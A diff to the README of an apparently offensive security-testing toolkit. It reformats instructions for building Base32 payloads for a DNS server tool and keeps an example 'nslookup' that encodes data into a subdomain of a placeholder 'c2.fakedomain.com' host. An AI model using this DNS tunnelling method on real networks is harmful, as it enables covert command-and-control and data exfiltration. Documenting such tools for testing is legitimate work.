@@ -102,9 +102,9 @@ These tools are intended solely for **security testing purposes**. I am not resp
 ---
 
 ## Base32 Payload Instructions for ns_dns_server.py (Client)
-IMPORTANT NOTE: Maximum Length of a DNS Label: Each label (subdomain) in a DNS name can be up to 63 characters.
-                Maximum Length of the Entire Domain Name: The full domain name (including all labels and dots) can be a maximum of 253 characters.
-                
+**IMPORTANT NOTE:**
+- **Maximum Length of a DNS Label:** Each label (subdomain) in a DNS name can be up to 63 characters.
+- **Maximum Length of the Entire Domain Name:** The full domain name (including all labels and dots) can be a maximum of 253 characters.
 
 1. Use [CyberChef](https://gchq.github.io/CyberChef/#recipe=To_Base32('A-Z2-7%3D')) to create a Base32 payload.
    
@@ -128,7 +128,9 @@ IMPORTANT NOTE: Maximum Length of a DNS Label: Each label (subdomain) in a DNS n
    ```bash
    nslookup KRCVGVCJJZDSAVCFKNKESTSHEAYTEMY.c2.fakedomain.com
    ```
-  Extra Note: The domain string KRCVGVCJJZDSAVCFKNKESTSHEAYTEMY.c2.fakedomain.com contains 49 characters. Also the '=' is padded by the script when it recieves it.
+  **EXTRA NOTE:**
+  - The '=' is added by the script when it tries to decrypt it.
+  - The domain string KRCVGVCJJZDSAVCFKNKESTSHEAYTEMY.c2.fakedomain.com contains 49 characters.
 ---
 
 **Note:** All other tools not documented here are works in progress.
